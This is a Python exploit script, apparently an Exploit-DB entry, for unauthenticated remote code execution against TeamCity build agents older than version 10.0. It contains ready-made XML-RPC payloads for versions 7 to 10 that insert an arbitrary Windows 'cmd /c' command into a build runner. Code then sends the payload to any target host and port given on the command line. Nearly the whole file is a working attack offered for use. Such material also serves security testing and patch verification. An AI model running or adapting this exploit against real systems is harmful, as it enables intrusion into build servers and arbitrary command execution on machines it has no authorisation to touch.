#!/usr/local/bin/python3
# Exploit Title: TeamCity Agent XML-RPC 10.0 - Remote Code Execution
# Date: 2020-03-20
# Exploit Author: Dylan Pindur
# Vendor Homepage: https://www.jetbrains.com/teamcity/
# Version: TeamCity < 10.0 (42002)
# Tested on: Windows 10 (x64)
# References:
# https://www.exploit-db.com/exploits/45917
# https://www.tenable.com/plugins/nessus/94675
#
# TeamCity Agents configured to use bidirectional communication allow the execution
# of commands sent to them via an XML-RPC endpoint.
#
# This script requires the following python modules are installed
# pip install requests
#


import requests
import sys

# region tc7
teamcity_7_req = """
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>buildAgent.runBuild</methodName>
  <params>
    <param>
      <value>
        <![CDATA[
          <AgentBuild>
            <myBuildId>123456</myBuildId>
            <myBuildTypeId>x</myBuildTypeId>
            <myCheckoutType>ON_AGENT</myCheckoutType>
            <myDefaultCheckoutDirectory>x</myDefaultCheckoutDirectory>
            <myServerParameters class="tree-map">
              <no-comparator/>
              <entry>
                <string>system.build.number</string>
                <string>0</string>
              </entry>
            </myServerParameters>
            <myVcsRootOldRevisions class="tree-map">
              <no-comparator/>
            </myVcsRootOldRevisions>
            <myVcsRootCurrentRevisions class="tree-map">
              <no-comparator/>
            </myVcsRootCurrentRevisions>
            <myAccessCode/>
            <myArtifactDependencies/>
            <myArtifactPaths/>
            <myBuildTypeOptions/>
            <myFullCheckoutReasons/>
            <myPersonalVcsChanges/>
            <myUserBuildParameters/>
            <myVcsChanges/>
            <myVcsRootEntries/>
            <myBuildRunners>
              <jetbrains.buildServer.agentServer.BuildRunnerData>
                <myRunType>simpleRunner</myRunType>
                <myRunnerName>x</myRunnerName>
                <myRunnerParameters class="tree-map">
                  <no-comparator/>
                  <entry>
                    <string>script.content</string>
                    <string>{SCRIPT}</string>
                  </entry>
                  <entry>
                    <string>teamcity.step.mode</string>
                    <string>default</string>
                  </entry>
                  <entry>
                    <string>use.custom.script</string>
                    <string>true</string>
                  </entry>
                </myRunnerParameters>
                <myServerParameters class="tree-map">
                  <no-comparator/>
                  <entry>
                    <string>teamcity.build.step.name</string>
                    <string>x</string>
                  </entry>
                </myServerParameters>
              </jetbrains.buildServer.agentServer.BuildRunnerData>
            </myBuildRunners>
            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>
            <myBuildFeatures/>
          </AgentBuild>
        ]]>
      </value>
    </param>
  </params>
</methodCall>
""".strip()
# endregion

# region tc8
teamcity_8_req = """
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>buildAgent.runBuild</methodName>
  <params>
    <param>
      <value>
        <![CDATA[
          <AgentBuild>
            <myBuildId>123456</myBuildId>
            <myBuildTypeId>x</myBuildTypeId>
            <myCheckoutType>ON_AGENT</myCheckoutType>
            <myDefaultCheckoutDirectory>x</myDefaultCheckoutDirectory>
            <myServerParameters class="tree-map">
              <entry>
                <string>system.build.number</string>
                <string>0</string>
              </entry>
            </myServerParameters>
            <myAccessCode/>
            <myArtifactDependencies/>
            <myArtifactPaths/>
            <myBuildTypeOptions/>
            <myFullCheckoutReasons/>
            <myPersonalVcsChanges/>
            <myUserBuildParameters/>
            <myVcsChanges/>
            <myVcsRootCurrentRevisions class="tree-map"/>
            <myVcsRootEntries/>
            <myVcsRootOldRevisions class="tree-map"/>
            <myBuildRunners>
              <jetbrains.buildServer.agentServer.BuildRunnerData>
                <myId>x</myId>
                <myIsDisabled>false</myIsDisabled>
                <myRunType>simpleRunner</myRunType>
                <myRunnerName>x</myRunnerName>
                <myChildren class="list"/>
                <myServerParameters class="tree-map">
                    <entry>
                      <string>teamcity.build.step.name</string>
                      <string>x</string>
                    </entry>
                  </myServerParameters>
                <myRunnerParameters class="tree-map">
                  <entry>
                    <string>script.content</string>
                    <string>{SCRIPT}</string>
                  </entry>
                  <entry>
                    <string>teamcity.step.mode</string>
                    <string>default</string>
                  </entry>
                  <entry>
                    <string>use.custom.script</string>
                    <string>true</string>
                  </entry>
                  </myRunnerParameters>
                </jetbrains.buildServer.agentServer.BuildRunnerData>
            </myBuildRunners>
            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>
            <myBuildFeatures/>
          </AgentBuild>
        ]]>
      </value>
    </param>
  </params>
</methodCall>
""".strip()
# endregion

# region tc9
teamcity_9_req = """
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>buildAgent.runBuild</methodName>
  <params>
    <param>
      <value>
        <![CDATA[
          <AgentBuild>
            <myBuildId>123456</myBuildId>
            <myBuildTypeId>x</myBuildTypeId>
            <myBuildTypeExternalId>x</myBuildTypeExternalId>
            <myCheckoutType>ON_AGENT</myCheckoutType>
            <myDefaultCheckoutDirectory>x</myDefaultCheckoutDirectory>
            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>
            <myServerParameters class="StringTreeMap">
              <k>system.build.number</k>
              <v>0</v>
            </myServerParameters>
            <myAccessCode/>
            <myArtifactDependencies/>
            <myArtifactPaths/>
            <myBuildFeatures/>
            <myBuildTypeOptions/>
            <myFullCheckoutReasons/>
            <myPersonalVcsChanges/>
            <myUserBuildParameters/>
            <myVcsChanges/>
            <myVcsRootCurrentRevisions class="tree-map"/>
            <myVcsRootEntries/>
            <myVcsRootOldRevisions class="tree-map"/>
            <myBuildRunners>
              <jetbrains.buildServer.agentServer.BuildRunnerData>
                <myId>x</myId>
                <myIsDisabled>false</myIsDisabled>
                <myRunType>simpleRunner</myRunType>
                <myRunnerName>x</myRunnerName>
                <myChildren class="list"/>
                <myServerParameters class="tree-map">
                  <entry>
                    <string>teamcity.build.step.name</string>
                    <string>x</string>
                  </entry>
                </myServerParameters>
                <myRunnerParameters class="tree-map">
                  <entry>
                    <string>script.content</string>
                    <string>{SCRIPT}</string>
                  </entry>
                  <entry>
                    <string>teamcity.step.mode</string>
                    <string>default</string>
                  </entry>
                  <entry>
                    <string>use.custom.script</string>
                    <string>true</string>
                  </entry>
                </myRunnerParameters>
              </jetbrains.buildServer.agentServer.BuildRunnerData>
            </myBuildRunners>
          </AgentBuild>
        ]]>
      </value>
    </param>
  </params>
</methodCall>
""".strip()
# endregion

# region tc10
teamcity_10_req = """
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>buildAgent.runBuild</methodName>
  <params>
    <param>
      <value>
        <![CDATA[
          <AgentBuild>
            <myBuildId>123456</myBuildId>
            <myBuildTypeId>x</myBuildTypeId>
            <myBuildTypeExternalId>x</myBuildTypeExternalId>
            <myCheckoutType>ON_AGENT</myCheckoutType>
            <myVcsSettingsHashForServerCheckout>x</myVcsSettingsHashForServerCheckout>
            <myVcsSettingsHashForAgentCheckout>123456</myVcsSettingsHashForAgentCheckout>
            <myVcsSettingsHashForManualCheckout>x</myVcsSettingsHashForManualCheckout>
            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>
            <myServerParameters class="StringTreeMap">
              <k>system.build.number</k>
              <v>0</v>
            </myServerParameters>
            <myAccessCode/>
            <myArtifactDependencies/>
            <myArtifactPaths/>
            <myBuildFeatures/>
            <myBuildTypeOptions/>
            <myFullCheckoutReasons/>
            <myParametersSpecs class="StringTreeMap"/>
            <myPersonalVcsChanges/>
            <myUserBuildParameters/>
            <myVcsChanges/>
            <myVcsRootCurrentRevisions class="tree-map"/>
            <myVcsRootEntries/>
            <myVcsRootOldRevisions class="tree-map"/>
            <myBuildRunners>
              <jetbrains.buildServer.agentServer.BuildRunnerData>
                <myId>x</myId>
                <myIsDisabled>false</myIsDisabled>
                <myRunType>simpleRunner</myRunType>
                <myRunnerName>x</myRunnerName>
                <myChildren class="list"/>
                <myServerParameters class="tree-map">
                  <entry>
                    <string>teamcity.build.step.name</string>
                    <string>x</string>
                  </entry>
                </myServerParameters>
                <myRunnerParameters class="tree-map">
                  <entry>
                    <string>script.content</string>
                    <string>{SCRIPT}</string>
                  </entry>
                  <entry>
                    <string>teamcity.step.mode</string>
                    <string>default</string>
                  </entry>
                  <entry>
                    <string>use.custom.script</string>
                    <string>true</string>
                  </entry>
                </myRunnerParameters>
              </jetbrains.buildServer.agentServer.BuildRunnerData>
            </myBuildRunners>
          </AgentBuild>
        ]]>
      </value>
    </param>
  </params>
</methodCall>
""".strip()
# endregion

def prepare_payload(version, cmd):
    if version == 7:
        return teamcity_7_req.replace("{SCRIPT}", "cmd /c {}".format(cmd))
    elif version == 8:
        return teamcity_8_req.replace("{SCRIPT}", "cmd /c {}".format(cmd))
    elif version == 9:
        return teamcity_9_req.replace("{SCRIPT}", "cmd /c {}".format(cmd))
    elif version == 10:
        return teamcity_10_req.replace("{SCRIPT}", "cmd /c {}".format(cmd))
    else:
        raise Exception("No payload available for version {}".format(version))

def send_req(host, port, payload):
    headers = {
        "Content-Type": "text/xml"
    }
    url = "http://{}:{}/".format(host, port)
    r = requests.post(url, headers=headers, data=payload)
    if r.status_code == 200 and 'fault' not in r.text:
        print('Command sent successfully')
    else:
        print('Command failed')
        print(r.text)


if len(sys.argv) != 4:
    print('[!] Missing arguments')
    print('[ ] Usage: {} <target> <port> <cmd>'.format(sys.argv[0]))
    print("[ ] E.g. {} 192.168.1.128 9090 'whoami > C:\\x.txt'".format(sys.argv[0]))
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
cmd = sys.argv[3]

version = input("Enter TeamCity version (7,8,9,10): ")
version = int(version.strip())
if version not in [7, 8, 9, 10]:
    print("Please select a valid version (7,8,9,10)")
    sys.exit(1)

payload = prepare_payload(version, cmd)
send_req(target, str(port), payload)